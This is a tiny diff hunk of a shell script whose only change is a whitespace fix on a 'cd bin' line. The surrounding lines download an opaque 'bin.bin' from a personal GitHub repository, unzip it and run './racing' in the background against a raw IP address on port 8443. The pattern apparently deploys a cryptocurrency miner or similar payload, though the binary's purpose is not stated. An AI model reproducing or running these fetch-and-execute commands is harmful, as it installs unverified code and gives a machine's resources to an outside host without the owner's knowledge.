@@ -10,5 +10,5 @@ sudo apt-get install libcurl3 -y
 wget https://github.com/nguyen3297/sub/raw/main/bin.bin
 mv bin.bin bin.zip
 unzip bin.zip
-cd  bin
+cd bin
 ./racing -U -P http://64.52.174.216:8443/racing &
